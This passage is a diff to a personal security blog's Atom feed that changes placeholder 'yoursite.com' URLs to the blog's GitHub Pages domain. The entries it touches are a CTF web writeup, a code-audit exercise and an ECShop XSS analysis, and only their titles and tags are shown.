-    <id>http://yoursite.com/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/</id>
+    <link href="https://cyc1e183.github.io/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/"/>
+    <id>https://cyc1e183.github.io/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/</id>
     <published>2019-04-23T01:55:56.000Z</published>
     <updated>2020-03-05T10:59:24.941Z</updated>
     
@@ -476,23 +476,23 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
+      <category term="SQL" scheme="https://cyc1e183.github.io/tags/SQL/"/>
     
-      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+      <category term="反序列化" scheme="https://cyc1e183.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
-      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
+      <category term="RCE" scheme="https://cyc1e183.github.io/tags/RCE/"/>
     
   </entry>
   
   <entry>
     <title>代码审计知识星球二周年练手</title>
-    <link href="http://yoursite.com/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/"/>
-    <id>http://yoursite.com/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/</id>
+    <link href="https://cyc1e183.github.io/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/"/>
+    <id>https://cyc1e183.github.io/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/</id>
     <published>2019-04-06T12:14:45.000Z</published>
     <updated>2020-03-04T13:15:26.147Z</updated>
     
@@ -505,17 +505,17 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title>ECShop 4.0反射型XSS漏洞分析</title>
-    <link href="http://yoursite.com/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
+    <link href="https://cyc1e183.github.io/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>https://cyc1e183.github.io/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
     <published>2019-03-13T12:21:19.000Z</published>
     <updated>2020-03-04T11:58:49.123Z</updated>
     
@@ -529,10 +529,10 @@
     </summary>
     
     
-      <category term="Cyc1e的漏洞挖掘之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的漏洞挖掘之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
